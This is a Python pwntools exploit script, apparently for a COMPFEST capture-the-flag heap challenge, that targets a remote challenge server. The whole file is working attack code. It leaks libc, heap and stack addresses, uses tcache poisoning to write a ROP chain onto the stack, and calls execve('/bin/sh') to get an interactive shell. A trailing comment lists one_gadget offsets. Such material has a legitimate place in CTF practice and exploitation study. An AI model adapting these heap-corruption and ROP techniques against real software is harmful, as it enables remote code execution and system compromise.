#!/usr/bin/python3

from pwn import *

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                # brva 0x183E
                brva 0x1725 
                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('challenges.ctf.compfest.id', 9020)
else:
    p = process(exe.path)


def add(idx, sz, title=b'wan', pa=b'wan'):
    sla(b'> ', b'1')
    sa(b'index:', str(idx))
    sa(b'Title:', (title))
    sla(b'size:', str(sz))
    sa(b'Content:', pa)


def remove(idx):
    sla(b'> ', b'4')
    sla(b'Which?', str(idx))


def edit(idx, pa):
    sla(b'> ', b'3')
    sla(b'Which?', str(idx))
    sa(b'content:', pa)


def view(idx):
    sla(b'> ', b'2')
    sla(b'Which?', str(idx))


add(0, 0x428, b'a', b'a')   # p1
add(1, 0x20, b'/bin/sh')                # g1

add(2, 0x418)               # p2
add(3, 0x20)                # g2

remove(0)                   # p1

add(4, 0x438)               # g3
view(0)
p.recvuntil(b'Content: ')
libc.address = u64(p.recv(8).ljust(8, b'\0')) - 0x1ecfd0
info("libc.address: " + hex(libc.address))
p.recv(8)
heap = u64(p.recv(8).ljust(8, b'\0'))
info("heap: " + hex(heap))
remove(2)                   # p2


edit(0, flat(libc.address+0x1ecfd0, libc.address +
     0x1ecfd0, heap, heap-0xf8-0x20-4))
add(5, 0x438)              # g4
add(6, 0x438)              # g4
add(7, 0x438)              # g4
add(8, 0x438)              # g4
# resize 5 6 7 8
edit(4, flat(b'a'*0x438, 0x81, b'b'*0x70, 0x80, 0x21,
             b'a'*0x3b8, 0x81, b'b'*0x70, 0x80, 0x21,
             b'a'*0x3b8, 0x71, b'b'*0x70, 0x70, 0x21,
             b'a'*0x3b8, 0x71, b'b'*0x70, 0x70, 0x21,
             ))
remove(6)
remove(5)
remove(8)
remove(7)
# tcache poisoning to leak stack
edit(4, flat(b'a'*0x438, 0x81, p64(libc.sym.environ)))
add(5, 0x78)
add(6, 0x78, b'\x38', b'\x38')
view(6)
p.recvuntil(b'Content: ')
stack = u64(p.recv(8).ljust(8, b'\0'))
info("stack: " + hex(stack))
# tcache poisoning to ropchain in addSong
edit(4, flat(b'a'*0x438, 0x81, b'b'*0x70, 0x80, 0x21,
             b'a'*0x3b8, 0x81, b'b'*0x70, 0x80, 0x21,
             b'a'*0x3b8, 0x71, stack-0x120
             ))
add(7, 0x68)
# GDB()
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address
pop_rax = rop.find_gadget(['pop rax', 'ret']).address
pop_rdx = rop.find_gadget(['pop rdx', 'pop r12', 'ret']).address
syscall = rop.find_gadget(["syscall", "ret"]).address
add(8, 0x68, b'wan', flat(
    pop_rdi, next(libc.search(b'/bin/sh')),
    pop_rsi, 0,
    pop_rdx, 0, 0,
    pop_rax, 0x3b,
    syscall
))
p.interactive()
# 26739
'''
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
'''
